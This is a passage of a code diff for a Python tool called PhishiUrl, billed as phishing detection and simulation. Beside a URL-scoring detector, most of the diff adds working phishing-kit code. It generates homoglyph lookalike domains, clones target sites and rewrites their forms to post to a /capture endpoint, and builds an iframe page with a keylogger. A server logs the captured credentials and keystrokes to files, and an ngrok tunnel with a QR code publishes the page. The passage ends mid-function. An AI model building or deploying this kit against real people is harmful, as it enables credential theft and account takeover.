-        backup_path = hosts_path + '.backup'
-        with open(hosts_path, 'r', encoding='utf-8') as f:
-            content = f.read()
-        with open(backup_path, 'w', encoding='utf-8') as f:
-            f.write(content)
-        console.print(f"[green]Backed up hosts file to {backup_path}[/green]")
-
-        # Remove existing entries for the domain
-        lines = content.splitlines()
-        lines = [line for line in lines if not line.strip().startswith(f'127.0.0.1 {homoglyph_domain}') and not line.strip().startswith(f'0.0.0.0 {homoglyph_domain}')]
-        lines.append(entry.strip())
-
-        # Write updated hosts file
-        with open(hosts_path, 'w', encoding='utf-8') as f:
-            f.write('\n'.join(lines) + '\n')
-        console.print(f"[green]Hosts file updated: {homoglyph_domain} mapped to {ip}[/green]")
-        return True
-    except Exception as e:
-        console.print(f"[red]Error modifying hosts file: {str(e)}[/red]")
-        return False
-
-def is_admin():
-    """Check if the script is running with admin privileges."""
-    try:
-        return win32security.GetTokenInformation(
-            win32security.OpenProcessToken(win32api.GetCurrentProcess(), win32con.TOKEN_QUERY),
-            win32security.TokenElevation
-        )['TokenIsElevated']
-    except:
-        return False
-
-# Phishing URL Generation
-def generate_phishing_urls(domain, tld, check_connection=False, output_file=False, check_availability=False):
-    domain = domain.lower()
-    phishing_replacements = unicode_replacements + extra_unicode_replacements
-    matching_chars = [key for repl in phishing_replacements for key in repl if key in domain]
-
-    results = []
-    for combination in itertools.chain.from_iterable(itertools.combinations(matching_chars, i) for i in range(1, 9)):
-        new_domain = domain
-        unicode_chars, char_names = [], []
-        for char in combination:
-            for repl in phishing_replacements:
-                if char in repl:
-                    unicode_char = repl[char]
-                    unicode_chars.append(unicode_char)
-                    new_domain = new_domain.replace(char, unicode_char)
-                    for u_repl in phishing_replacements:
-                        if unicode_char in u_repl.values():
-                            char_names.append(list(u_repl.keys())[0])
-        phishing_url = new_domain + tld
-        result = {
-            'original_domain': domain + tld,
-            'phishing_url': phishing_url,
-            'replaced_chars': combination,
-            'unicode_chars': unicode_chars,
-            'unicode_names': char_names
+        return {
+            'url': url,
+            'score': min(score, 100),
+            'alerts': alerts,
+            'is_phishing': score >= 60,
         }
-        if check_connection:
-            result['connection_status'] = test_connection(phishing_url)
-        if check_availability:
-            availability = check_domain_availability(phishing_url)
-            result['availability'] = "Available" if availability is None else "Registered"
-        results.append(result)
 
-        for path in generate_phishing_paths(new_domain, tld, check_connection, output_file):
-            path_result = {'phishing_url': path, 'connection_status': test_connection(path) if check_connection else None}
-            results.append(path_result)
+# ──────────────────────────────────────────────
+# Homoglyph URL Generation
+# ──────────────────────────────────────────────
+def generate_homoglyph_suggestions(domain: str, check_availability: bool = False) -> list:
+    """Return list of {'domain': str, 'status': str} dicts."""
+    base = domain.lower()
+    seen = {base}
+    results = [{'domain': base, 'status': 'Original'}]
 
-    display_phishing_urls(results, output_file)
+    # Deduplicate replacements by (char→uni_char) pair
+    seen_pairs = set()
+    all_replacements = []
+    for r in UNICODE_REPLACEMENTS + EXTRA_UNICODE_REPLACEMENTS:
+        for char, uni_char in r.items():
+            pair = (char, uni_char)
+            if pair not in seen_pairs:
+                seen_pairs.add(pair)
+                all_replacements.append({char: uni_char})
+
+    for repl in all_replacements:
+        for char, uni_char in repl.items():
+            if char in base:
+                candidate = base.replace(char, uni_char)
+                if candidate not in seen:
+                    seen.add(candidate)
+                    if check_availability:
+                        available = check_domain_availability(candidate)
+                        status = 'Available' if available else 'Registered'
+                    else:
+                        status = 'Unknown'
+                    results.append({'domain': candidate, 'status': status})
+
     return results
 
-def generate_phishing_paths(base_domain, tld, check_connection=False, output_file=False):
-    example_paths = ["/example", "/index", "/test", "/login"]
-    phishing_paths = []
-    for path in example_paths:
-        for repl in extra_unicode_replacements + [{'null': '\x00'}]:
-            original_char = list(repl.keys())[0]
-            phishing_char = list(repl.values())[0]
-            if original_char in path:
-                phishing_path = path.replace(original_char, phishing_char)
-                phishing_paths.append(base_domain + tld + phishing_path)
-    return phishing_paths
+def generate_phishing_urls(
+    domain: str,
+    tld: str,
+    check_connection: bool = False,
+    output_file: str = '',
+    check_availability: bool = False,
+) -> list:
+    """Generate all homoglyph URL combinations (capped at 500 for usability)."""
+    domain = domain.lower()
+    all_replacements = UNICODE_REPLACEMENTS + EXTRA_UNICODE_REPLACEMENTS
+    matching = [k for r in all_replacements for k in r if k in domain]
 
-def display_phishing_urls(results, output_file=False):
-    table = Table(title="Generated Phishing URLs")
-    table.add_column("Original Domain")
-    table.add_column("Phishing URL")
-    table.add_column("Replaced Chars")
-    table.add_column("Unicode Chars")
+    results = []
+    LIMIT = 500
+
+    for r in range(1, min(len(matching) + 1, 5)):
+        for combo in itertools.combinations(matching, r):
+            if len(results) >= LIMIT:
+                break
+            new_domain = domain
+            uni_chars  = []
+            for char in combo:
+                for repl in all_replacements:
+                    if char in repl:
+                        new_domain = new_domain.replace(char, repl[char])
+                        uni_chars.append(repl[char])
+                        break
+
+            full = new_domain + tld
+            entry = {
+                'original_domain': domain + tld,
+                'phishing_url':    full,
+                'replaced_chars':  list(combo),
+                'unicode_chars':   uni_chars,
+            }
+            if check_connection:
+                entry['connection'] = test_connection(full)
+            if check_availability:
+                available = check_domain_availability(full)
+                entry['availability'] = 'Available' if available else 'Registered'
+            results.append(entry)
+
+    _display_phishing_urls(results, output_file)
+    return results
+
+def _display_phishing_urls(results: list, output_file: str = '') -> None:
+    table = Table(title="Generated Phishing URLs", show_lines=True)
+    table.add_column("Original",    style="cyan")
+    table.add_column("Phishing URL", style="red")
+    table.add_column("Replaced",    style="yellow")
     table.add_column("Availability", justify="center")
 
-    for result in results:
-        if 'original_domain' in result:
-            table.add_row(
-                result['original_domain'],
-                result['phishing_url'],
-                str(result['replaced_chars']),
-                str(result['unicode_chars']),
-                result.get('availability', 'N/A')
-            )
-
+    for r in results:
+        if 'original_domain' not in r:
+            continue
+        table.add_row(
+            r['original_domain'],
+            r['phishing_url'],
+            ', '.join(r.get('replaced_chars', [])),
+            r.get('availability', 'N/A'),
+        )
     console.print(table)
+
     if output_file:
         with open(output_file, 'a', encoding='utf-8') as f:
-            f.write(json.dumps(results, indent=2, ensure_ascii=False) + '\n')
+            json.dump(results, f, indent=2, ensure_ascii=False)
+            f.write('\n')
 
-# Tunneling
-def start_ngrok(port=8080):
-    config = load_config()
-    ngrok_token = config.get('ngrok_token')
-    if not ngrok_token:
-        ngrok_token = click.prompt("Enter Ngrok token", hide_input=True)
-        config['ngrok_token'] = ngrok_token
-        save_config(config)
-    
-    ngrok.set_auth_token(ngrok_token)
+# ──────────────────────────────────────────────
+# Website Cloning
+# ──────────────────────────────────────────────
+def _get_driver():
+    """Return a headless Chrome/Chromium driver, or None if unavailable."""
     try:
-        tunnel = ngrok.connect(port)
-        console.print(f"[green]Tunnel created: {tunnel.public_url}[/green]")
-        generate_qr_code(tunnel.public_url)
-        return tunnel.public_url
+        from selenium import webdriver
+        from selenium.webdriver.chrome.options import Options
+        from selenium.webdriver.chrome.service import Service
+
+        opts = Options()
+        opts.add_argument('--headless')
+        opts.add_argument('--no-sandbox')
+        opts.add_argument('--disable-dev-shm-usage')
+        opts.add_argument('--disable-gpu')
+        opts.add_argument('--window-size=1920,1080')
+
+        # Try webdriver-manager first, then system chromedriver
+        try:
+            from webdriver_manager.chrome import ChromeDriverManager
+            svc = Service(ChromeDriverManager().install())
+            return webdriver.Chrome(service=svc, options=opts)
+        except Exception:
+            pass
+
+        # Fallback: system chromedriver
+        return webdriver.Chrome(options=opts)
     except Exception as e:
-        console.print(f"[red]Error creating tunnel: {str(e)}[/red]")
+        console.print(f"[yellow]Selenium unavailable ({e}). Falling back to requests-only mode.[/yellow]")
         return None
 
-def start_web_server(port, clone_dir=None, template='index.html', local_address=None, ngrok_address=None):
-    if clone_dir:
-        os.chdir(clone_dir)
-    else:
-        os.chdir(load_config()['templates_path'])
-    server = HTTPServer(
-        ('', port),
-        lambda *args, **kwargs: PhishingHandler(
-            *args,
-            template=template,
-            local_address=local_address,
-            ngrok_address=ngrok_address,
-            **kwargs
-        )
-    )
-    console.print(f"[green]Web server started on port {port}[/green]")
-    server.serve_forever()
+def clone_website(
+    url: str,
+    save_name: str,
+    use_local: bool = False,
+    local_folder: str = '',
+    download_js: bool = True,
+    download_all: bool = False,
+    use_iframe: bool = False,
+) -> str:
+    """
+    Clone a website and instrument it for credential capture.
+    Returns the path of the clone directory, or '' on failure.
+    """
+    cfg      = load_config()
+    safe     = re.sub(r'[^\w.-]', '_', save_name)
+    clone_dir = os.path.join(cfg['templates_path'], 'cloned', safe)
+    os.makedirs(clone_dir, exist_ok=True)
 
+    headers = {
+        'User-Agent': (
+            'Mozilla/5.0 (X11; Linux x86_64) '
+            'AppleWebKit/537.36 (KHTML, like Gecko) '
+            'Chrome/120.0.0.0 Safari/537.36'
+        )
+    }
+
+    # ── iframe mode ──────────────────────────────────────────────────────────
+    if use_iframe:
+        return _build_iframe_page(url, clone_dir)
+
+    # ── local folder mode ─────────────────────────────────────────────────────
+    if use_local:
+        return _clone_from_local(local_folder, clone_dir, url)
+
+    # ── URL cloning mode ──────────────────────────────────────────────────────
+    console.print(f"[cyan]Fetching: {url}[/cyan]")
+    try:
+        resp = requests.get(url, headers=headers, timeout=15)
+        resp.raise_for_status()
+    except requests.RequestException as e:
+        console.print(f"[red]Failed to fetch {url}: {e}[/red]")
+        return ''
+
+    soup = BeautifulSoup(resp.text, 'html.parser')
+
+    # Download assets
+    _download_assets(soup, url, clone_dir, headers, download_js, download_all)
+
+    # Optional: enhance DOM with Selenium
+    driver = _get_driver()
+    if driver:
+        try:
+            driver.get(url)
+            from selenium.webdriver.support.ui import WebDriverWait
+            from selenium.webdriver.support import expected_conditions as EC
+            from selenium.webdriver.common.by import By
+            try:
+                WebDriverWait(driver, 6).until(
+                    EC.presence_of_element_located((By.TAG_NAME, 'input'))
+                )
+            except Exception:
+                pass
+            soup = BeautifulSoup(driver.page_source, 'html.parser')
+            console.print("[green]DOM enriched via Selenium.[/green]")
+        except Exception as e:
+            console.print(f"[yellow]Selenium DOM enrichment failed: {e}[/yellow]")
+        finally:
+            try:
+                driver.quit()
+            except Exception:
+                pass
+
+    return _instrument_and_save(soup, url, clone_dir)
+
+def _build_iframe_page(target_url: str, clone_dir: str) -> str:
+    """Build an iframe-based phishing page with a keylogger overlay."""
+    html = f"""<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  <title>Loading...</title>
+  <style>
+    * {{ margin: 0; padding: 0; box-sizing: border-box; }}
+    body {{ overflow: hidden; }}
+    #overlay {{
+      position: fixed; top: 0; left: 0;
+      width: 100%; height: 100%;
+      z-index: 9999; opacity: 0;
+      pointer-events: none;
+    }}
+    iframe {{
+      width: 100vw; height: 100vh; border: none;
+    }}
+  </style>
+</head>
+<body>
+  <div id="overlay"></div>
+  <iframe src="{target_url}" id="target-frame" sandbox="allow-same-origin allow-scripts allow-forms"></iframe>
+  <script>
+  (function() {{
+    var log = [];
+    var lastSave = Date.now();
+
+    document.addEventListener('keydown', function(e) {{
+      log.push({{t: Date.now(), k: e.key}});
+      if (Date.now() - lastSave > 5000) {{
+        sendLog();
+        lastSave = Date.now();
+      }}
+    }});
+
+    // Intercept form posts from iframe (same-origin only)
+    window.addEventListener('message', function(e) {{
+      if (e.data && e.data.type === 'FORM_DATA') {{
+        fetch('/capture', {{
+          method: 'POST',
+          headers: {{'Content-Type': 'application/x-www-form-urlencoded'}},
+          body: new URLSearchParams(e.data.payload).toString()
+        }});
+      }}
+    }});
+
+    function sendLog() {{
+      if (!log.length) return;
+      fetch('/keylog', {{
+        method: 'POST',
+        headers: {{'Content-Type': 'application/json'}},
+        body: JSON.stringify(log)
+      }});
+      log = [];
+    }}
+
+    window.addEventListener('beforeunload', sendLog);
+  }})();
+  </script>
+</body>
+</html>"""
+    path = os.path.join(clone_dir, 'index.html')
+    with open(path, 'w', encoding='utf-8') as f:
+        f.write(html)
+    console.print(f"[green]Iframe page saved to {path}[/green]")
+    return clone_dir
+
+def _clone_from_local(local_folder: str, clone_dir: str, original_url: str) -> str:
+    if not os.path.isdir(local_folder):
+        console.print(f"[red]Local folder not found: {local_folder}[/red]")
+        return ''
+    index = os.path.join(local_folder, 'index.html')
+    if not os.path.isfile(index):
+        console.print(f"[red]index.html not found in {local_folder}[/red]")
+        return ''
+
+    # Copy all files
+    for item in os.listdir(local_folder):
+        src = os.path.join(local_folder, item)
+        dst = os.path.join(clone_dir, item)
+        if os.path.isfile(src):
+            shutil.copy2(src, dst)
+        elif os.path.isdir(src):
+            shutil.copytree(src, dst, dirs_exist_ok=True)
+
+    with open(index, 'r', encoding='utf-8', errors='replace') as f:
+        soup = BeautifulSoup(f, 'html.parser')
+
+    return _instrument_and_save(soup, original_url or '', clone_dir)
+
+def _download_assets(
+    soup: BeautifulSoup,
+    base_url: str,
+    clone_dir: str,
+    headers: dict,
+    download_js: bool,
+    download_all: bool,
+) -> None:
+    """Download referenced assets and rewrite their URLs to local paths."""
+    tasks = []
+
+    for tag in soup.find_all('link', href=True):
+        tasks.append(('href', tag, urllib.parse.urljoin(base_url, tag['href'])))
+
+    if download_js:
+        for tag in soup.find_all('script', src=True):
+            tasks.append(('src', tag, urllib.parse.urljoin(base_url, tag['src'])))
+
+    if download_all:
+        for tag in soup.find_all('img', src=True):
+            tasks.append(('src', tag, urllib.parse.urljoin(base_url, tag['src'])))
+        for tag in soup.find_all(['source', 'video', 'audio'], src=True):
+            tasks.append(('src', tag, urllib.parse.urljoin(base_url, tag['src'])))
+    else:
+        # At minimum, grab logo images
+        for tag in soup.find_all('img', src=True):
+            src_val = tag.get('src', '')
+            classes = ' '.join(tag.get('class', []))
+            if 'logo' in src_val.lower() or 'logo' in classes.lower():
+                tasks.append(('src', tag, urllib.parse.urljoin(base_url, src_val)))
+
+    # Deduplicate tasks by URL
+    seen_urls = set()
+    deduped = []
+    for item in tasks:
+        if item[2] not in seen_urls:
+            seen_urls.add(item[2])
+            deduped.append(item)
+    tasks = deduped
+
+    for attr, tag, asset_url in tasks:
+        try:
+            parsed = urllib.parse.urlparse(asset_url)
+            # Preserve subdirectory path (e.g. /assets/foo.js → assets/foo.js)
+            rel_path = parsed.path.lstrip('/')
+            if not rel_path or rel_path.endswith('/'):
+                rel_path = f'asset_{abs(hash(asset_url))}.bin'
+            if not os.path.splitext(rel_path)[1]:
+                rel_path += '.bin'
+
+            local_path = os.path.join(clone_dir, rel_path)
+            os.makedirs(os.path.dirname(local_path), exist_ok=True)
+
+            r = requests.get(asset_url, headers=headers, timeout=8)
+            r.raise_for_status()
+            with open(local_path, 'wb') as f:
+                f.write(r.content)
+            # Point tag to relative path (use forward slashes for HTML)
+            tag[attr] = rel_path.replace(os.sep, '/')
+            console.print(f"[dim]Downloaded: {rel_path}[/dim]")
+        except Exception as e:
+            console.print(f"[dim]Asset skip ({asset_url.split('/')[-1]}): {e}[/dim]")
+
+def _instrument_and_save(soup: BeautifulSoup, original_url: str, clone_dir: str) -> str:
+    """Inject credential-capture JS/form modifications and save index.html."""
+    inputs = soup.find_all('input')
+    if not inputs:
+        console.print("[yellow]No <input> elements found – page saved without capture logic.[/yellow]")
+        _write_html(soup, clone_dir)
+        return clone_dir
+
+    # Ensure every input has a name
+    for idx, inp in enumerate(inputs):
+        if not inp.get('name'):
+            inp['name'] = f'field_{idx}'
+
+    forms = soup.find_all('form')
+    if forms:
+        for form in forms:
+            original_action = form.get('action', '')
+            if original_action and not original_action.startswith('http'):
+                original_action = urllib.parse.urljoin(original_url, original_action)
+            form['method'] = 'POST'
+            form['action'] = '/capture'
+            # Store original action – use attrs= to avoid BS4 'name' kwarg clash
+            hidden = soup.new_tag('input')
+            hidden.attrs = {'type': 'hidden', 'name': 'original_action',
+                            'value': original_action or original_url}
+            form.insert(0, hidden)
+            # Ensure submit button
+            if not form.find(lambda t: t.name in ('button', 'input') and t.get('type') == 'submit'):
+                btn = soup.new_tag('button')
+                btn['type'] = 'submit'
+                btn['style'] = 'display:none'
+                form.append(btn)
+    else:
+        # Wrap orphan inputs in a synthetic form
+        new_form = soup.new_tag('form')
+        new_form['method'] = 'POST'
+        new_form['action'] = '/capture'
+        hidden = soup.new_tag('input')
+        hidden.attrs = {'type': 'hidden', 'name': 'original_action', 'value': original_url}
+        new_form.append(hidden)
+        first = inputs[0]
+        parent = first.parent
+        parent.insert(list(parent.children).index(first), new_form)
+        for inp in inputs:
+            inp.extract()
+            new_form.append(inp)
+
+    # Inject capture script
+    capture_js = soup.new_tag('script')
+    capture_js.string = r"""
+(function() {
+  document.querySelectorAll('form').forEach(function(form) {
+    form.addEventListener('submit', function(e) {
+      e.preventDefault();
+      var fd = new FormData(form);
+      fetch('/capture', { method: 'POST', body: fd })
+        .then(function() {
+          var orig = form.querySelector('input[name="original_action"]');
+          if (orig && orig.value) window.location.href = orig.value;
+        })
+        .catch(console.error);
+    });
+  });
+})();
+"""
+    body = soup.find('body') or soup
+    body.append(capture_js)
+
+    _write_html(soup, clone_dir)
+    return clone_dir
+
+def _write_html(soup: BeautifulSoup, clone_dir: str) -> None:
+    path = os.path.join(clone_dir, 'index.html')
+    with open(path, 'w', encoding='utf-8') as f:
+        f.write(str(soup))
+    console.print(f"[green]Cloned page saved → {path}[/green]")
+
+# ──────────────────────────────────────────────
+# HTTP Server
+# ──────────────────────────────────────────────
 class PhishingHandler(SimpleHTTPRequestHandler):
-    def __init__(self, *args, template='index.html', local_address=None, ngrok_address=None, **kwargs):
-        self.template = template
-        self.local_address = local_address
-        self.ngrok_address = ngrok_address
+    def __init__(self, *args, template='index.html',
+                 local_address='', ngrok_address='', **kwargs):
+        self.template       = template
+        self.local_address  = local_address
+        self.ngrok_address  = ngrok_address
         super().__init__(*args, **kwargs)
+
+    def log_message(self, fmt, *args):
+        # Suppress default access log noise; use rich instead
+        console.print(f"[dim]{self.address_string()} – {fmt % args}[/dim]")
 
     def do_GET(self):
         if self.path == '/':
-            self.send_response(301)
+            self.send_response(302)
             self.send_header('Location', f'/{self.template}')
             self.end_headers()
         else:
             super().do_GET()
 
     def do_POST(self):
-        if self.path == '/capture':
-            content_length = int(self.headers['Content-Length'])
-            post_data = self.rfile.read(content_length).decode('utf-8')
-            # Parse POST data
-            post_params = urllib.parse.parse_qs(post_data)
-            # Flatten params (take first value for each key)
-            post_params = {k: v[0] for k, v in post_params.items()}
-            
-            timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
-            credentials_file = 'credentials.txt'
-            mode = 'a' if os.path.exists(credentials_file) else 'w'
-            
-            # Format the captured data
-            with open(credentials_file, mode, encoding='utf-8') as f:
-                if mode == 'a':
-                    f.write('\n')
-                addresses = []
-                if self.local_address:
-                    addresses.append(f"Local: {self.local_address}")
-                if self.ngrok_address:
-                    addresses.append(f"Ngrok: {self.ngrok_address}")
-                f.write(f"[{timestamp}] {' | '.join(addresses)}\n")
-                
-                # Write login-related fields
-                login_data_written = False
-                for key, value in post_params.items():
-                    if key != 'original_action':
-                        if any(keyword in key.lower() for keyword in LOGIN_KEYWORDS):
-                            f.write(f"- {key.capitalize()}: {value}\n")
-                            login_data_written = True
-                
-                # If no login data was written, write all fields as "Other Data"
-                if not login_data_written:
-                    for key, value in post_params.items():
-                        if key != 'original_action':
-                            f.write(f"- {key.capitalize()}: {value}\n")
-            
-            console.print(f"[green]Credentials captured and saved to {credentials_file}[/green]")
+        length   = int(self.headers.get('Content-Length', 0))
+        raw      = self.rfile.read(length).decode('utf-8', errors='replace')
+        params   = {k: v[0] for k, v in urllib.parse.parse_qs(raw).items()}
+        ts       = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
 
-            # Respond with a simple 200 OK
+        if self.path == '/capture':
+            self._save_credentials(params, ts)
             self.send_response(200)
-            self.send_header('Content-type', 'text/plain')
+            self.send_header('Content-Type', 'text/plain')
             self.end_headers()
-            self.wfile.write(b"Credentials captured")
+            self.wfile.write(b'ok')
+
+        elif self.path == '/keylog':
+            self._save_keylog(raw, ts)
+            self.send_response(200)
+            self.end_headers()
+            self.wfile.write(b'ok')
+
         else:
             self.send_response(404)
             self.end_headers()
 
-def generate_qr_code(url):
-    qr = qrcode.QRCode()
-    qr.add_data(url)
-    qr.print_ascii()
-    console.print("[green]QR code generated for tunnel URL[/green]")
+    def _save_credentials(self, params: dict, ts: str) -> None:
+        creds_file = 'credentials.txt'
+        addrs = []
+        if self.local_address:
+            addrs.append(f'Local: {self.local_address}')
+        if self.ngrok_address:
+            addrs.append(f'Ngrok: {self.ngrok_address}')
 
-# Homoglyph Suggestions
-def suggest_homoglyph_domains(domain):
-    domain = domain.lower()
-    suggestions = [domain]
-    unicode_chars = []
-    char_names = []
+        with open(creds_file, 'a', encoding='utf-8') as f:
+            f.write(f"\n[{ts}] {' | '.join(addrs)}\n")
+            for k, v in params.items():
+                if k != 'original_action':
+                    f.write(f"  {k}: {v}\n")
 
-    for repl in unicode_replacements + extra_unicode_replacements:
-        for char, unicode_char in repl.items():
-            if char in domain:
-                new_domain = domain.replace(char, unicode_char)
-                if new_domain != domain:
-                    suggestions.append(new_domain)
-                    unicode_chars.append(unicode_char)
-                    char_names.append(char)
+        console.print(f"[bold green]✓ Credentials captured → {creds_file}[/bold green]")
+        for k, v in params.items():
+            if k != 'original_action' and any(kw in k.lower() for kw in LOGIN_KEYWORDS):
+                console.print(f"  [yellow]{k}[/yellow]: {v}")
 
-    results = []
-    for sugg in suggestions:
-        availability = check_domain_availability(sugg)
-        status = "Available" if availability is None else "Registered"
-        results.append({'domain': sugg, 'status': status})
+    def _save_keylog(self, raw: str, ts: str) -> None:
+        try:
+            entries = json.loads(raw)
+            keys = ''.join(e.get('k', '') for e in entries)
+        except Exception:
+            keys = raw
+        with open('keylog.txt', 'a', encoding='utf-8') as f:
+            f.write(f"[{ts}] {keys}\n")
+        console.print(f"[dim]Keylog entry saved ({len(keys)} chars)[/dim]")
 
-    table = Table(title="Suggested Domains")
-    table.add_column("Domain")
-    table.add_column("Status")
-    for result in results:
-        table.add_row(result['domain'], result['status'])
-    console.print(table)
 
-    return results
+def start_web_server(
+    port: int,
+    clone_dir: str = '',
+    template: str = 'index.html',
+    local_address: str = '',
+    ngrok_address: str = '',
+) -> None:
+    serve_dir = clone_dir if clone_dir else load_config()['templates_path']
+    os.chdir(serve_dir)
 
-def check_domain_availability(domain_name):
-    try:
-        return whois(domain_name).registrar
-    except:
-        return None
-
-# Reporting
-def generate_report(results):
-    table = Table(title="Phishing Analysis Results")
-    table.add_column("URL")
-    table.add_column("Risk Score")
-    table.add_column("Status")
-    table.add_column("Alerts")
-
-    for result in results:
-        status = "[red]Phishing[/red]" if result['is_phishing'] else "[green]Safe[/green]"
-        alerts = "; ".join(result['alerts']) if result['alerts'] else "None"
-        table.add_row(result['url'], str(result['score']), status, alerts)
-
-    console.print(table)
-
-    with open('report.json', 'w', encoding='utf-8') as f:
-        json.dump(results, f, indent=2, ensure_ascii=False)
-    console.print("[green]Report saved to report.json[/green]")
-
-# Display Banner
-def display_banner(output_file=False):
-    banner = """
-██████╗ ██╗  ██╗██╗███████╗██╗  ██╗██╗██╗   ██╗██████╗ ██╗                   ██╗██████╗ ███╗   ██╗
-██╔══██╗██║  ██║██║██╔════╝██║  ██║██║██║   ██║██╔══██╗██║                   ██║██╔══██╗████╗  ██║
-██████╔╝███████║██║███████╗███████║██║██║   ██║██████╔╝██║         █████╗    ██║██║  ██║██╔██╗ ██║
-██╔═══╝ ██╔══██║██║╚════██║██╔══██║██║██║   ██║██╔══██╗██║         ╚════╝    ██║██║  ██║██║╚██╗██║
-██║     ██║  ██║██║███████║██║  ██║██║╚██████╔╝██║  ██║███████╗              ██║██████╔╝██║ ╚████║
-╚═╝     ╚═╝  ╚═╝╚═╝╚══════╝╚═╝  ╚═╝╚═╝ ╚═════╝ ╚═╝  ╚═╝╚══════╝              ╚═╝╚═════╝ ╚═╝  ╚═══╝
-
-Tool: {tool_name}
-By: {author_name}
-Version: {version_num}
-GitHub: {github_url}
-""".format(
-        tool_name=TOOL_NAME,
-        author_name=AUTHOR_NAME,
-        version_num=VERSION_NUM,
-        github_url=GITHUB_URL
+    handler = lambda *a, **kw: PhishingHandler(
+        *a, template=template,
+        local_address=local_address,
+        ngrok_address=ngrok_address,
+        **kw,
     )
-    console.print(f"[green]{banner}[/green]")
-    if output_file:
-        with open(output_file, 'a', encoding='utf-8') as f:
-            f.write(banner + '\n')
+    srv = HTTPServer(('', port), handler)
+    console.print(Panel(
+        f"[green]Server running on port {port}[/green]\n"
+        f"Local:  http://localhost:{port}\n"
+        + (f"Ngrok:  {ngrok_address}" if ngrok_address else ""),
+        title="PhishiUrl Server",
+    ))
+    try:
+        srv.serve_forever()
+    except KeyboardInterrupt:
+        console.print("\n[yellow]Server stopped.[/yellow]")
 
-# CLI Commands
+# ──────────────────────────────────────────────
+# Ngrok
+# ──────────────────────────────────────────────
+def start_ngrok(port: int) -> str:
+    cfg = load_config()
+    token = cfg.get('ngrok_token', '')
+    if not token:
+        token = click.prompt("Ngrok auth token", hide_input=True)
+        cfg['ngrok_token'] = token
+        save_config(cfg)
+
+    ngrok.set_auth_token(token)
+    try:
+        tunnel = ngrok.connect(port)
+        url    = tunnel.public_url
+        console.print(f"[green]Ngrok tunnel: {url}[/green]")
+        _print_qr(url)
+        return url
+    except Exception as e:
+        console.print(f"[red]Ngrok error: {e}[/red]")
+        return ''
+
+def _print_qr(url: str) -> None:
+    qr = qrcode.QRCode(border=1)
+    qr.add_data(url)
+    f = StringIO()
+    qr.print_ascii(out=f)
+    console.print(Panel(f.getvalue(), title="QR Code"))
+
+# ──────────────────────────────────────────────
+# Reporting
+# ──────────────────────────────────────────────
+def generate_report(results: list) -> None:
+    table = Table(title="Phishing Analysis Results", show_lines=True)
+    table.add_column("URL",        style="cyan", max_width=50)
+    table.add_column("Score",      justify="center")
+    table.add_column("Verdict",    justify="center")
+    table.add_column("Top Alert",  style="yellow")
+
+    for r in results:
+        score   = r['score']
+        verdict = "[red]PHISHING[/red]" if r['is_phishing'] else "[green]SAFE[/green]"
+        top     = r['alerts'][0] if r['alerts'] else '—'
+        table.add_row(r['url'], str(score), verdict, top)
+
+    console.print(table)
+
+    report = {
+        'generated': datetime.now().isoformat(),
+        'tool': f'{TOOL_NAME} {VERSION_NUM}',
+        'results': results,
+    }
+    with open('report.json', 'w', encoding='utf-8') as f:
+        json.dump(report, f, indent=2, ensure_ascii=False)
+    console.print("[green]Full report → report.json[/green]")
+
+# ──────────────────────────────────────────────
+# Banner
+# ──────────────────────────────────────────────
+BANNER = r"""
+██████╗ ██╗  ██╗██╗███████╗██╗  ██╗██╗██╗   ██╗██████╗ ██╗      ██╗██████╗ ███╗
+██╔══██╗██║  ██║██║██╔════╝██║  ██║██║██║   ██║██╔══██╗██║      ██║██╔══██╗████╗
+██████╔╝███████║██║███████╗███████║██║██║   ██║██████╔╝██║      ██║██║  ██║██╔██╗
+██╔═══╝ ██╔══██║██║╚════██║██╔══██║██║██║   ██║██╔══██╗██║      ██║██║  ██║██║╚██╗
+██║     ██║  ██║██║███████║██║  ██║██║╚██████╔╝██║  ██║███████╗ ██║██████╔╝██║ ╚██╗
+╚═╝     ╚═╝  ╚═╝╚═╝╚══════╝╚═╝  ╚═╝╚═╝ ╚═════╝ ╚═╝  ╚═╝╚══════╝ ╚═╝╚═════╝ ╚═╝  ╚╝
+"""
+
+def display_banner() -> None:
+    console.print(f"[bold green]{BANNER}[/bold green]")
+    console.print(
+        f"  Tool: [cyan]{TOOL_NAME}[/cyan]  |  "
+        f"Author: [cyan]{AUTHOR_NAME}[/cyan]  |  "
+        f"Version: [cyan]{VERSION_NUM}[/cyan]  |  "
+        f"GitHub: [cyan]{GITHUB_URL}[/cyan]\n"
+    )
+
+# ──────────────────────────────────────────────
+# CLI
+# ──────────────────────────────────────────────
 @click.group()
 def cli():
-    """PhishiUrl - Phishing Detection and Simulation Tool"""
-    pass
+    """PhishiUrl – Phishing Detection & Simulation Tool (v1.3.0)"""
 
 @cli.command()
-@click.option('--url', help='URL to analyze')
-@click.option('--file', type=click.Path(exists=True), help='File with list of URLs')
-@click.option('--output', help='Output file for results')
+@click.option('--url',    help='Single URL to analyse')
+@click.option('--file',   type=click.Path(exists=True), help='File with one URL per line')
+@click.option('--output', help='Save results to this JSON file')
 def check(url, file, output):
-    """Analyze URL(s) for phishing"""
-    if output:
-        with open(output, 'w', encoding='utf-8') as f:
-            f.write('')
-        display_banner(output)
-    else:
-        display_banner()
-
+    """Analyse URL(s) for phishing indicators."""
+    display_banner()
     detector = PhishingDetector()
-    results = []
+    results  = []
 
-    def is_valid_url(url):
-        regex = re.compile(r'^(https?://)?([^\s/]+)([/\S]*)?$')
-        return bool(regex.match(url.strip()))
+    URL_RE = re.compile(r'^(https?://)?([^\s/]+)([/\S]*)?$')
+
+    def process(u):
+        u = u.strip()
+        if URL_RE.match(u):
+            results.append(detector.detect(u))
+        else:
+            console.print(f"[yellow]Skipping invalid URL: {u}[/yellow]")
 
     if url:
-        if is_valid_url(url):
-            results.append(detector.detect(url))
-        else:
-            console.print(f"[yellow]Invalid URL format: {url}[/yellow]")
-            results.append({'url': url, 'score': 0, 'alerts': ['Invalid URL format'], 'is_phishing': False})
+        process(url)
     elif file:
-        with open(file, 'r', encoding='utf-8') as f:
-            for line in f:
-                url = line.strip()
-                if is_valid_url(url):
-                    results.append(detector.detect(url))
-                else:
-                    console.print(f"[yellow]Skipping invalid URL: {url}[/yellow]")
-                    results.append({'url': url, 'score': 0, 'alerts': ['Invalid URL format'], 'is_phishing': False})
+        # PowerShell 'echo' creates UTF-16 LE with BOM - detect automatically
+        with open(file, 'rb') as fb:
+            raw = fb.read()
+        if raw.startswith(b'\xff\xfe'):
